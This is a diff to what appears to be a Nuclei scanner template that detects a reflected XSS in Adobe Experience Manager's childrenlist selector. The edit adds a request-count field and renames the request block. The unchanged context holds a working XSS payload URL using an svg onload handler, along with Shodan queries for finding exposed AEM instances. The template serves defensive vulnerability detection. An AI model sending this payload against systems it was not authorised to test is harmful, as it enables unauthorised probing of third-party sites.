@@ -10,6 +10,7 @@ info:
     - https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java
     - https://cystack.net/en/plugins/cystack.remote.aem_childlist_selector_xss
   metadata:
+    max-request: 1
     shodan-query:
       - http.title:"AEM Sign In"
       - http.component:"Adobe Experience Manager"
@@ -19,7 +20,7 @@ info:
     cwe-id: CWE-79
   tags: xss,aem,adobe
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
